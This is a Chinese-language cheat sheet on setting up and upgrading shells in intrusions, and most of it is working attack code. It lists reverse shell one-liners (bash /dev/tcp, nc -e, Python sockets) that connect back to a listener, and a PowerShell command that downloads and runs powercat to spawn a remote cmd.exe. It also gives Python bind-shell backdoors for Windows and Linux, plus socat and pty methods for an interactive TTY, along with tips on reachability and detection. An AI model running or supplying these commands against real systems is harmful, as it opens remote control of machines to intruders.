# Shell 建立与交互升级速查

## 0x01 概述

本篇记录三类场景：

- 反弹 Shell
- 正向 Shell
- 升级为可交互 TTY

示例中默认回连地址为 `192.168.1.1`，监听端口为 `7777` 或 `8888`，实际使用时替换为自己的地址。

## 0x02 反弹 Shell

### 1. Linux

#### `bash`

```bash
/bin/bash -i >& /dev/tcp/192.168.1.1/7777 0>&1
```

#### `nc`

```bash
nc -e /bin/bash 192.168.1.1 7777
```

#### `python`

可直接脚本执行，也可以通过 `python -c` 单行触发。

```python
import os
os.system("bash -c 'bash -i >& /dev/tcp/192.168.1.1/7777 0>&1'")
```

```python
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.1", 7777))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
```

### 2. Windows

#### `powercat`

地址：

- https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1

```powershell
powershell -nop -exec bypass -c "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 192.168.1.1 -p 9999 -e cmd.exe"
```

## 0x03 正向 Shell

### 1. Python on Windows

监听在 `7777` 端口，可以通过 `nc` 连接：

```python
from socket import *
import subprocess
import threading

def send(talk, proc):
    while True:
        msg = proc.stdout.readline()
        talk.send(msg)

if __name__ == "__main__":
    server = socket(AF_INET, SOCK_STREAM)
    server.bind(("0.0.0.0", 7777))
    server.listen(5)
    print "waiting for connect"
    talk, addr = server.accept()
    print "connect from", addr
    proc = subprocess.Popen(
        "cmd.exe /K",
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        shell=True
    )
    t = threading.Thread(target=send, args=(talk, proc))
    t.setDaemon(True)
    t.start()
    while True:
        cmd = talk.recv(1024)
        proc.stdin.write(cmd)
        proc.stdin.flush()
```

### 2. Python on Linux

监听在 `7777` 端口，可以通过 `nc` 连接：

```python
from socket import *
import subprocess

if __name__ == "__main__":
    server = socket(AF_INET, SOCK_STREAM)
    server.bind(("0.0.0.0", 7777))
    server.listen(5)
    print "waiting for connect"
    talk, addr = server.accept()
    print "connect from", addr
    subprocess.Popen(["/bin/sh", "-i"], stdin=talk, stdout=talk, stderr=talk, shell=True)
```

## 0x04 提升交互能力

### 1. `python pty`

把普通 Shell 升级为可交互 TTY：

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

### 2. `socat`

本机监听：

```bash
socat file:`tty`,raw,echo=0 tcp-listen:8888
```

目标主机回连：

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.0.1:8888
```

如果没有安装 `socat`，可以考虑使用静态编译版本：

- https://github.com/andrew-d/static-binaries

## 0x05 排查点

- 目标是否能主动访问你的监听地址。
- 目标是否存在 `bash`、`nc`、`python`、`powershell`。
- 监听端口是否被本机防火墙拦截。
- 回连成功但没有交互时，优先检查 TTY 和标准输入输出绑定。

## 0x06 注意事项

- 正向 Shell 更依赖目标侧开放端口，实战里通常不如反弹 Shell 稳定。
- Windows 下 PowerShell 下载执行很容易被日志和安全软件命中。
- 升级 TTY 后如果还要跑 `su`、`sudo`、文本编辑器，建议再补齐终端环境变量。

## Ref

- [将简单的 Shell 升级为完全交互式 TTY](https://www.4hou.com/posts/mQ7R)
- [Python 正向连接后门](https://www.leavesongs.com/PYTHON/python-shell-backdoor.html)
